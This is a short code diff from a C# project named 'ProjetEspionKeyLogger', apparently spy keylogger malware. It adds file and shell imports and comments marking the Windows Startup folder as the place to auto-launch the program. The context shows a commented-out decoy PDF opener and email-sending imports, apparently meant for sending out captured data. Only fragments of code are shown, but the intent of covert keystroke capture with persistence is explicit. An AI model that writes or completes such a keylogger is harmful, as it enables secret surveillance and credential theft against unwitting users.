@@ -3,11 +3,14 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using Outlook = Microsoft.Office.Interop.Outlook;
 using System.Net.Mail;
+using System.IO;
+using Microsoft.WindowsAPICodePack.Shell;
 
 namespace ProjetEspionKeyLogger
 {
     class Program
     {
+
         static void Main(string[] args)
         {
 
@@ -24,6 +27,10 @@ namespace ProjetEspionKeyLogger
             {UseShellExecute = true};
             //Ouverture du pdf
             pdf.Start();*/
+
+          
+            //Dossier des programme a demarer automatiquement
+            //C:/Users/Charlie/AppData/Roaming/Microsoft/Windows/start Menu/Programs/Startup
 
 
             //création de l'objet KeyLogger
